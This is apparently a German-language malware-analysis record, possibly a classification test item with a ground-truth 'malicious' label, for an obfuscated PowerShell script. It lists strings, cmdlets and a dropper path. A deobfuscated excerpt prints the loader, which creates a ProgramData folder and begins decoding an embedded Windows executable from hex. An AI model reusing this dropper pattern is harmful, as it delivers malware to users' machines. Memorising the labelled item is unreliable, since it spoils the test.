@@ -1,0 +1,71 @@
+{
+  "meta": {
+    "quelldatei": "05daac7bbab4f98d298036f05b6ca784a38ac23f3a2b40fe764fdf5a13b89949.ps1",
+    "sha256": "05daac7bbab4f98d298036f05b6ca784a38ac23f3a2b40fe764fdf5a13b89949",
+    "groesse_bytes": 260030,
+    "zeilen": 83,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": true,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "C:\\ProgramData\\WD",
+      "\r\nfunction go {\r\nparam($WD)$WD = $WD -split ",
+      " | ? { $_ }\r\n\r\nForEach ($chrome in $WD){[Convert]::ToInt32($chrome,16)}}\r\n[byte[]] $MyS  = go(",
+      ")\r\n[byte[]] $RNP  = go("
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 2
+  },
+  "stufe2_features": {
+    "strings": [
+      "C:\\ProgramData\\WD",
+      "\r\nfunction go {\r\nparam($WD)$WD = $WD -split ",
+      " | ? { $_ }\r\n\r\nForEach ($chrome in $WD){[Convert]::ToInt32($chrome,16)}}\r\n[byte[]] $MyS  = go(",
+      ")\r\n[byte[]] $RNP  = go("
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "New-Item",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\WD"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "C:\\ProgramData\\WD",
+      "\r\nfunction go {\r\nparam($WD)$WD = $WD -split ",
+      " | ? { $_ }\r\n\r\nForEach ($chrome in $WD){[Convert]::ToInt32($chrome,16)}}\r\n[byte[]] $MyS  = go(",
+      ")\r\n[byte[]] $RNP  = go("
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 2,
+    "beobachtete_cmdlets": [
+      "New-Item",
+      "Start-Sleep"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\ProgramData\\WD"
+      ]
+    },
+    "deobfuskiert_auszug": "﻿$L1 = \"C:\\ProgramData\\WD\"\r\nNew-Item $L1 -ItemType Directory -Force\r\nStart-Sleep 2\r\n$Content = @'\r\nfunction go {\r\nparam($WD)$WD = $WD -split '(..)' | ? { $_ }\r\n\r\nForEach ($chrome in $WD){[Convert]::ToInt32($chrome,16)}}\r\n[byte[]] $MyS  = go('4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D8D34630000000000000000E00002010B01080000E60000000A0000000000002E050100002000000020010000004000002000000002000004000000000000000400000000000000006001000002000000000000020040850000100000100000000010000010000000000000100000000000000000000000E00401004B00000000200100FF07000000000000000000000000000000000000004001000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000034E500000020000000E6000000020000000000000000000000000000200000602E72737263000000FF070000002001000008000000E80000000000000000000000000000400000402E72656C6F6300000C000000004001000002000000F00000000000000000000000000000400000420000000000000000000000000000000010050100000000004800000002000500A8700000389400000300000001000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BFEB1E56FBCD973BB219022430A57843003D5644D21E62B9D4F180E7E6C339412E002F005C0000001E02281B00000A2A2E730400000680010000042A1A28300000062A1A7E190000042A1E0280190000042A1A7E1A0000042A1E02801A0000042A1A7E1B0000042A1E02801B0000042A1A7E1C0000042A1E02801C0000042A1A7E1D0000042A1E02801D0000042A1A7E1E0000042A1E02801E0000042A1A7E1F0000042A1E02801F0000042A1A7E200000042A1A7E210000042A1E0280210000042A1A7E220000042A1E0280220000042A1A7E230000042A1E0280230000042A2A02284100000A16FE032A327E0D000004036F4200000A2A2E731B00000A80200000042AE6282C0000063A28000000282D0000063A1E000000282E0000063A",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
